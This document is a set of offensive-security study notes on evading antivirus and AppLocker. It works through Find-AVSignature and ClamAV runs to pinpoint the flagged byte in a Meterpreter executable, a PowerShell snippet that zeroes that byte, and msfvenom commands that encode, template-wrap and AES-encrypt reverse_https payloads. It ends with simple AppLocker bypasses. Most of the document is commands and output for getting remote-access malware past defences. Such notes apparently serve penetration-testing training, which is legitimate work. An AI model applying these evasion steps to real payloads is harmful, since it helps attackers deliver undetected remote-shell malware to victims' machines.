---
tags:
- training material
created: 2020-01-01
lastmod: 2020-01-01
published: 2020-01-01
image: 
description: 
---
#### Find-AVSignature (good in theory, bad in practice)

>[!code]- Downloaded and Import Find-AVSignature
>###### [Download](https://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html) then Import Find-AVSignature
>```powershell
>Import-Module ./Find-AVSignature.ps1
>```

>[!code]- Run Find-AVSignature to find the flagged byte[s]
>###### Run for the first time
>- `StartByte 0`, `EndByte max` to scan the entire executable
>- `Interval` to specify the size of each individual segment of the file to split
>```powershell
>PS C:\Tools> Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
>```
>###### Run AV against each split file
>The below output shows that the first signature was detected in the third file, somewhere between offset 10000 and 20000.
>```powershell
>PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest1
>C:\Tools\avtest1\met_0.bin: OK  
>C:\Tools\avtest1\met_10000.bin: OK
>C:\Tools\avtest1\met_20000.bin: Win.Trojan.MSShellcode-7 FOUND C:\Tools\avtest1\met_30000.bin: Win.Trojan.MSShellcode-7 FOUND C:\Tools\avtest1\met_40000.bin: Win.Trojan.MSShellcode-7 FOUND C:\Tools\avtest1\met_50000.bin: Win.Trojan.MSShellcode-7 FOUND C:\Tools\avtest1\met_60000.bin: Win.Trojan.MSShellcode-7 FOUND C:\Tools\avtest1\met_70000.bin: Win.Trojan.MSShellcode-7 FOUND C:\Tools\avtest1\met_73801.bin: Win.Trojan.MSShellcode-7 FOUND
>```
>###### Re-run against the first flagged file, but with increasinly granular parameters
>This will show where in first flagged file the flagged byte sequence lies.
>```powershell
>PS C:\Tools> Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force
>
># After the above results... more granular...
>PS C:\Tools> Find-AVSignature -StartByte 18000 -EndByte 19000 -Interval 100 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest3 -Verbose -Force
>
># More granular
>PS C:\Tools> Find-AVSignature -StartByte 18800 -EndByte 18900 -Interval 10 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest4 -Verbose -Force
>
>PS C:\Program Files\ClamAV> .\clamscan.exe C:\Tools\avtest5
>C:\Tools\avtest5\met_18860.bin: OK
>C:\Tools\avtest5\met_18861.bin: OK
>C:\Tools\avtest5\met_18862.bin: OK
>C:\Tools\avtest5\met_18863.bin: OK
>C:\Tools\avtest5\met_18864.bin: OK
>C:\Tools\avtest5\met_18865.bin: OK
>C:\Tools\avtest5\met_18866.bin: OK
>C:\Tools\avtest5\met_18867.bin: Win.Trojan.Swrort-5710536-0 FOUND C:\Tools\avtest5\met_18868.bin: Win.Trojan.Swrort-5710536-0 FOUND C:\Tools\avtest5\met_18869.bin: Win.Trojan.Swrort-5710536-0 FOUND C:\Tools\avtest5\met_18870.bin: Win.Trojan.Swrort-5710536-0 FOUND
>```

>[!code]- Change the flagged byte[s]
>###### Using PowerShell
>```powershell
>$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
>$bytes[18867] = 0
>[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
>```

>[!warning]- Sometimes you need to modify the before or after byte instead

>[!warning]- Sometimes also you need to change the flagged byte to 0xFF rather than 0x00

>[!code]- Bring back functionality to changed bytes
>Changing the bytes probably makes the exploit not work anymore. The exploit needs to be altered in such a way that it works again.
#### Encoding & encrypting payloads

>[!warning]- Encoding and/or encrypting alone may not work because the decoder/decryptor could be detectable

>[!code]- Msfvenom
>###### Use encoders (-e)
>```powershell
># 32-bit
>msfvenom -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe
># 64-bit
>msfvenom -e x64/zutto_dekiru
>```
>###### Use 64-bit payload where possible (/x64/)
>```powershell
>msfvenom -p windows/x64/meterpreter/reverse_https
># rather than
>msfvenom -p windows/meterpreter/reverse_https
>```
>###### Use templates (-x)
>```powershell
>msfvenom -x /home/kali/notepad.exe
>```
>###### Use encryption (--encrypt, --encrypt-key)
>```powershell
>msfvenom --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43
>```
#### AppLocker Bypasses

>[!code]-
>###### Change directory application run from
>```powershell
>copy C:\Windows\System32\calc.exe C:\Windows\Tasks\calc2.exe
>```
>###### Use Python or Perl
>```powershell
>C:\Users\student> python test.py
>```